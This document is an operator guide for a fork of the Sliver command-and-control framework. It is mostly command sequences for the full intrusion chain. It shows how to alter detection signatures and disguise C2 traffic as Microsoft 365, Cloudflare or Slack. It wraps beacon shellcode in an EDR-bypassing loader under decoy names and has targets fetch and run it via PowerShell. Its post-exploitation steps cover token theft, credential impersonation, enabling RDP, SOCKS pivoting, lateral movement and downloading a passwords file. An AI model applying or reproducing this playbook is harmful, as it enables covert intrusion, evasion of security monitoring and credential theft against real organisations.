# mgstate/sliver - Enhanced Fork Guide

## What's Different From Upstream Sliver

This fork adds several features and fixes on top of the official BishopFox Sliver C2 framework.

### New Commands
| Command | Description |
|---------|-------------|
| `rdp` | One-command RDP through implant - auto port-forward + launches RDP client |
| `steal-token PID` | Steal token by PID - resolves process owner automatically |
| `quick-impersonate` | Impersonate via creds (`-u/-p/-d`) or PID (`-P`), optional exec (`-e`) |
| `harriet` | Generate AES-encrypted, signed payloads using Harriet loader |

### SOCKS Proxy Fixes (RDP/High-Bandwidth Now Works)
The upstream SOCKS proxy had crippling performance issues making RDP unusable:
- **Removed 10ms sleep on every Read/Write/Close** in implant tunnel handler (was adding 20ms+ per round-trip)
- **Channel buffers**: 100 -> 512 (implant), 100 -> 512 (server)
- **Client buffer**: 4KB -> 64KB
- **Rate limiter**: 10 ops/s -> 50000 ops/s
- **Inactivity timeout**: 15s -> 120s (RDP sessions idle for minutes)
- **Write timeout**: 5s -> 10s
- **Batch size**: 100 -> 200
- **TCP keepalive + NoDelay** on SOCKS connections
- **Non-blocking send** prevents deadlock on saturated tunnels
- **SOCKS auth configured once** via sync.Once (was recreating per packet)

### Token Impersonation Fix
Upstream `impersonate` was unreliable - it compared `proc.Owner()` (returns `"DOMAIN\username"`) with exact match only, so `"admin"` never matched `"CORP\admin"`. Fixed with:
- **3-tier matching**: exact > case-insensitive > domain\user suffix match
- **Tries ALL matching processes** by priority, not just first found
- **steal-token** now properly resolves PID -> owner username

### Network Signature Removal
Two known Sliver network IOCs changed:
- Yamux magic bytes: `"MUX/1"` -> `"HSK/2"` (both implant + server)
- Envelope signing prefix: `"env-signing-v1:"` -> `"tls-auth-seed:"` (both sides)

### Opsec C2 Profiles (3 included)
Pre-built HTTP traffic mimicry profiles in `opsec-profiles/`:
- **microsoft365** - Mimics M365/Azure AD OAuth (Edge user-agent, ESTS cookies)
- **cloudflare** - Mimics CDN static asset fetches (CF-RAY headers, cf cookies)
- **slack** - Mimics Slack Web API calls (conversations.history, chat.postMessage)

### Harriet Integration
Built-in command to wrap shellcode with the Harriet AES-encrypted loader:
- 5 execution methods: directsyscall, queueapc, nativeapi, inject, aes
- EXE or DLL output format
- Code-signing with included cert
- `--shellcode` flag for pre-generated .bin files

---

## Prerequisites

### On Your Build/Teamserver Box (Kali/Ubuntu)
```bash
# Go 1.21+ (required for Sliver build)
wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin

# MinGW (for Harriet cross-compilation to Windows)
sudo apt install -y mingw-w64 osslsigncode python3-pycryptodome

# Harriet loader
git clone https://github.com/assume-breach/Home-Grown-Red-Team.git /opt/Home-Grown-Red-Team
cd /opt/Home-Grown-Red-Team/Harriet && bash setup.sh

# Clone this fork
git clone https://github.com/mgstate/sliver.git ~/sliver
cd ~/sliver
```

---

## Step 1: Build Sliver Server + Client

```bash
cd ~/sliver
make

# Outputs:
#   sliver-server   (teamserver binary)
#   sliver-client   (operator client)
```

If `make` fails on dependencies:
```bash
go mod download
make
```

---

## Step 2: Start the Teamserver

```bash
# First run generates certs + database
./sliver-server

# You'll see:
#   sliver >
```

### Create an Operator Config (for remote clients)
```
sliver > new-operator --name mgstate --lhost YOUR_TEAMSERVER_IP --lport 31337 --save /tmp/mgstate.cfg
```

Transfer `mgstate.cfg` to your operator machine, then connect:
```bash
./sliver-client import /tmp/mgstate.cfg
./sliver-client
```

---

## Step 3: Import Opsec C2 Profiles

```
sliver > c2profiles import -n microsoft365 -f ~/sliver/opsec-profiles/microsoft365-c2.json
sliver > c2profiles import -n cloudflare -f ~/sliver/opsec-profiles/cloudflare-cdn-c2.json
sliver > c2profiles import -n slack -f ~/sliver/opsec-profiles/slack-api-c2.json

# Verify loaded:
sliver > c2profiles
```

### Profile Details

**microsoft365** - Best for corporate environments
- User-Agent: Edge on Windows 10
- URL paths: `/common/oauth2/v2.0/token`, `/api/v1.0/me/messages`
- Headers: `sec-ch-ua: Microsoft Edge`, `Origin: outlook.office365.com`
- Cookies: ESTSAUTHPERSISTENT, ESTSAUTH, buid, fpc

**cloudflare** - Best general purpose
- User-Agent: Chrome on Windows 10
- URL paths: `/cdn-cgi/assets/main.js`, `/static/dist/chunk.css`
- Headers: CF-Cache-Status: HIT, CF-RAY, Server: cloudflare
- Cookies: __cf_bm, __cflb, __cfruid, cf_clearance

**slack** - Best for environments where Slack is used
- User-Agent: Chrome on Windows 10
- URL paths: `/api/conversations.history`, `/services/hooks/chat.postMessage`
- Headers: X-Slack-Req-Id, CORS headers
- Cookies: d, b, x, lc, shown_ssb_redirect

---

## Step 4: Start Listeners

### mTLS (Primary - encrypted, reliable, internal networks)
```
sliver > mtls --lhost 0.0.0.0 --lport 8888
```

### HTTPS (Internet-facing - blends with web traffic using profiles)
```
sliver > https --lhost 0.0.0.0 --lport 443 --domain your-c2-domain.com
```

### DNS (Backup - stealthiest, slowest)
```
sliver > dns --domains c2.yourdomain.com --lport 53
```

**Recommended Setup** - mTLS as primary + HTTPS as failover:
```
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > https --lhost 0.0.0.0 --lport 443 -d cdn-assets.yourdomain.com
```

---

## Step 5: Generate Implant

### Option A: Beacon (Recommended - async, stealthier)
```
sliver > generate beacon \
  --mtls YOUR_IP:8888 \
  --http https://cdn-assets.yourdomain.com \
  --os windows --arch amd64 \
  --format shellcode \
  --evasion \
  --c2profile cloudflare \
  --seconds 60 --jitter 30 \
  --limit-domainjoined \
  --reconnect 30 \
  --max-errors 10 \
  --strategy r \
  --save /tmp/beacon.bin
```

### Option B: Session (Interactive - for active exploitation)
```
sliver > generate \
  --mtls YOUR_IP:8888 \
  --os windows --arch amd64 \
  --format shellcode \
  --evasion \
  --c2profile microsoft365 \
  --limit-hostname TARGET-PC \
  --reconnect 15 \
  --max-errors 5 \
  --save /tmp/session.bin
```

### Opsec Flag Reference
| Flag | Purpose | Recommended Value |
|------|---------|-------------------|
| `--evasion` | Unhooks EDR userspace hooks | Always use |
| `--c2profile NAME` | HTTP traffic mimicry | `cloudflare` or `microsoft365` |
| `--seconds N --jitter N` | Beacon callback interval | `60 --jitter 30` (30-90s range) |
| `--limit-domainjoined` | Only run on domain machines | Use in corporate targets |
| `--limit-hostname X` | Only run on specific host | Use for targeted delivery |
| `--limit-datetime X` | Kill date (implant self-destructs) | `2026-04-01T00:00:00Z` |
| `--limit-fileexists X` | Sandbox check - needs file to exist | `C:\Windows\System32\svchost.exe` |
| `--strategy r` | Randomize C2 fallback order | Always `r` or `rd` |
| `--reconnect 30` | Seconds between reconnect attempts | 15-60 |
| `--max-errors 10` | Exit after N failed connections | 5-20 |

---

## Step 6: Wrap with Harriet (AV/EDR Bypass)

Takes raw shellcode and wraps it in an AES-encrypted, code-signed executable.

### DirectSyscalls (Best Evasion)
```
sliver > harriet \
  --shellcode /tmp/beacon.bin \
  --method directsyscall \
  --format exe \
  --output /tmp/update-service.exe \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

### QueueUserAPC (Good Evasion, Different Technique)
```
sliver > harriet \
  --shellcode /tmp/beacon.bin \
  --method queueapc \
  --format exe \
  --output /tmp/health-check.exe \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

### As DLL (For DLL sideloading)
```
sliver > harriet \
  --shellcode /tmp/beacon.bin \
  --method directsyscall \
  --format dll \
  --output /tmp/version.dll \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

### Methods Ranked (Best to Worst)
| Method | Technique | EDR Bypass |
|--------|-----------|------------|
| `directsyscall` | Direct syscall stubs, skips ntdll entirely | Best |
| `queueapc` | NtQueueApcThread + NtTestAlert | Great |
| `nativeapi` | NT Native API (NtAllocateVirtualMemory) | Good |
| `inject` | Remote process injection | Moderate |
| `aes` | In-process AES decrypt + execute | Basic |

### Harriet All Flags
| Flag | Short | Description |
|------|-------|-------------|
| `--shellcode` | `-s` | Path to pre-generated .bin shellcode file |
| `--method` | `-m` | Execution method (directsyscall/queueapc/nativeapi/inject/aes) |
| `--format` | `-f` | Output format: exe or dll |
| `--output` | `-o` | Output file path |
| `--harriet-path` | | Path to Harriet installation directory |

---

## Step 7: Deploy to Target

### Delivery Options
```bash
# Option 1: Sliver built-in website staging
sliver > websites add-content --website updates --web-path /patch.exe --content /tmp/update-service.exe

# Option 2: Python HTTP server
python3 -m http.server 80 --directory /tmp/

# On target (PowerShell):
# iwr http://YOUR_IP/update-service.exe -OutFile C:\Users\Public\update-service.exe
# Start-Process C:\Users\Public\update-service.exe
```

### Wait for Callback
```
# Beacons check in async:
sliver > beacons

# Sessions are immediate:
sliver > sessions

# Interact with a beacon:
sliver > use BEACON_ID

# Interact with a session:
sliver > use SESSION_ID
```

---

## Step 8: Post-Exploitation

### Recon
```
sliver (IMPLANT) > whoami
sliver (IMPLANT) > getuid
sliver (IMPLANT) > ps
sliver (IMPLANT) > ifconfig
sliver (IMPLANT) > netstat
sliver (IMPLANT) > getprivs
```

### Token Impersonation (Enhanced)

**Steal token by PID (resolves process owner automatically):**
```
sliver (IMPLANT) > ps                    # Find target process
sliver (IMPLANT) > steal-token 1234      # Steal its token
# Output: PID 1234 -> explorer.exe (owner: CORP\domainadmin)
#         Successfully stole token from PID 1234

sliver (IMPLANT) > whoami                # Verify: CORP\domainadmin
```

**Quick impersonate with credentials (Type 9 network logon):**
```
sliver (IMPLANT) > quick-impersonate -u administrator -p Password123! -d CORP
# Creates network logon token - access SMB, RDP, WinRM as that user

# With immediate command execution:
sliver (IMPLANT) > quick-impersonate -u administrator -p Password123! -d CORP \
  -e "net group \"Domain Admins\" /domain"
```

**Quick impersonate by PID:**
```
sliver (IMPLANT) > quick-impersonate -P 1234 -e "whoami /all"
```

**Revert when done:**
```
sliver (IMPLANT) > rev2self
```

### RDP Access (New Command)

**One-command RDP - auto port-forward + launch client:**
```
sliver (IMPLANT) > rdp
# Sets up 127.0.0.1:13389 -> target:3389 and launches mstsc/xfreerdp
```

**With credentials:**
```
sliver (IMPLANT) > rdp -u administrator -p Password123! -d CORP
```

**Enable RDP on target first (if disabled):**
```
sliver (IMPLANT) > rdp --enable -u admin -p pass
```

**Just the tunnel (manual connect):**
```
sliver (IMPLANT) > rdp --no-launch
# Then on your box: xfreerdp /v:127.0.0.1:13389 /u:admin /p:pass /cert:tofu
```

**RDP All Flags:**
| Flag | Short | Default | Description |
|------|-------|---------|-------------|
| `--target` | `-t` | (implant) | Target host for RDP |
| `--remote-port` | `-r` | 3389 | Remote RDP port |
| `--bind-port` | `-b` | 13389 | Local bind port for tunnel |
| `--username` | `-u` | | RDP username |
| `--password` | `-p` | | RDP password |
| `--domain` | `-d` | | Domain for auth |
| `--no-launch` | | false | Just create tunnel, don't launch client |
| `--enable` | | false | Enable RDP on target before connecting |

### SOCKS Proxy (Fixed - RDP/High-Bandwidth Works)

```
sliver (IMPLANT) > socks5 start -p 1080

# Now route ANY tool through the implant:
proxychains nmap -sT -p 445,3389,5985 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24 -u admin -p pass
proxychains evil-winrm -i 10.10.10.5 -u admin -p pass
proxychains xfreerdp /v:10.10.10.5 /u:admin /p:pass /cert:tofu

# RDP through SOCKS (alternative to rdp command for lateral targets):
proxychains xfreerdp /v:10.10.10.5:3389 /u:admin /p:pass /cert:tofu +clipboard

# Stop when done:
sliver (IMPLANT) > socks5 stop
```

### File Operations
```
sliver (IMPLANT) > download C:\\Users\\admin\\Documents\\passwords.xlsx
sliver (IMPLANT) > upload /tmp/tool.exe C:\\Users\\Public\\tool.exe
sliver (IMPLANT) > ls C:\\Users
sliver (IMPLANT) > cat C:\\Users\\admin\\Desktop\\notes.txt
```

### Execute Commands
```
sliver (IMPLANT) > shell                          # Interactive shell
sliver (IMPLANT) > execute -o cmd.exe /c whoami   # Single command
sliver (IMPLANT) > execute -o powershell.exe -c "Get-Process"
```

### Lateral Movement
```
# PsExec to another box (needs admin creds):
sliver (IMPLANT) > psexec -u admin -p pass -d CORP 10.10.10.5

# SSH pivot:
sliver (IMPLANT) > ssh -l root -p password 10.10.10.5
```

---

## Step 9: Cleanup

```
sliver (IMPLANT) > rev2self              # Drop stolen tokens
sliver (IMPLANT) > socks5 stop           # Stop SOCKS
sliver (IMPLANT) > kill                  # Kill the implant

# On teamserver:
sliver > jobs                            # List listeners
sliver > jobs -k JOB_ID                  # Kill a listener
```

---

## Quick Reference: Full Attack Flow

```
# 1. Build
make

# 2. Start server
./sliver-server

# 3. Import profiles
c2profiles import -n cloudflare -f opsec-profiles/cloudflare-cdn-c2.json

# 4. Start listeners
mtls --lhost 0.0.0.0 --lport 8888
https --lhost 0.0.0.0 --lport 443 -d cdn.yourdomain.com

# 5. Generate shellcode
generate beacon --mtls IP:8888 --http https://cdn.yourdomain.com \
  --os windows --arch amd64 --format shellcode --evasion \
  --c2profile cloudflare --seconds 60 --jitter 30 \
  --strategy r --save /tmp/sc.bin

# 6. Wrap with Harriet
harriet --shellcode /tmp/sc.bin --method directsyscall -o /tmp/payload.exe

# 7. Deliver and wait
beacons

# 8. Interact
use BEACON_ID
ps
steal-token 1234
rdp --enable -u admin -p pass
rev2self
kill
```

---

## Common Scenarios

### Scenario: Domain Admin Hunting
```
sliver (IMPLANT) > ps                              # Look for DA processes
sliver (IMPLANT) > steal-token 4567                # Steal DA token
sliver (IMPLANT) > execute -o cmd /c "net group \"Domain Admins\" /domain"
sliver (IMPLANT) > rev2self
```

### Scenario: RDP to Internal Box via SOCKS
```
sliver (IMPLANT) > socks5 start -p 1080
# On your Kali:
proxychains xfreerdp /v:10.10.10.50 /u:localadmin /p:pass /cert:tofu +clipboard
```

### Scenario: Quick Cred-Based Pivot
```
sliver (IMPLANT) > quick-impersonate -u admin -p Pass123! -d CORP \
  -e "dir \\\\fileserver\\share$"
sliver (IMPLANT) > rev2self
```

### Scenario: Beacon -> Interactive Session Upgrade
```
# Generate a session implant (not beacon):
sliver > generate --mtls IP:8888 --os windows --arch amd64 \
  --format shellcode --evasion --save /tmp/session.bin

# From beacon, upload and execute:
sliver (BEACON) > upload /tmp/session.bin C:\\Users\\Public\\svc.bin
sliver (BEACON) > execute -o rundll32.exe C:\\Users\\Public\\svc.bin,Start
```

---

## Files Changed From Upstream

```
client/command/harriet/               # NEW - Harriet integration command
client/command/rdp/                   # NEW - One-command RDP
client/command/privilege/steal-token.go    # REWRITTEN - PID-based token theft
client/command/privilege/quick-impersonate.go  # NEW - Enhanced impersonation
client/command/privilege/commands.go   # MODIFIED - New command registrations
client/command/server.go              # MODIFIED - Harriet registration
client/command/sliver.go              # MODIFIED - RDP registration
client/command/help/long-help.go      # MODIFIED - Help text for new commands
client/command/socks/socks-start.go   # MODIFIED - Keepalive/hint text
client/constants/constants.go         # MODIFIED - New command constants
client/core/socks.go                  # MODIFIED - 64KB buffer, 50k rate limit
implant/sliver/handlers/tunnel_handlers/socks_handler.go  # FIXED - Sleep removal
implant/sliver/priv/priv_windows.go   # FIXED - 3-tier impersonation matching
implant/sliver/transports/mtls/mtls.go  # MODIFIED - Signature changes
server/c2/mtls.go                     # MODIFIED - Matching signature changes
server/rpc/rpc-socks.go              # MODIFIED - Buffer/timeout tuning
opsec-profiles/                       # NEW - 3 C2 traffic profiles
OPSEC-GUIDE.md                        # NEW - This file
```
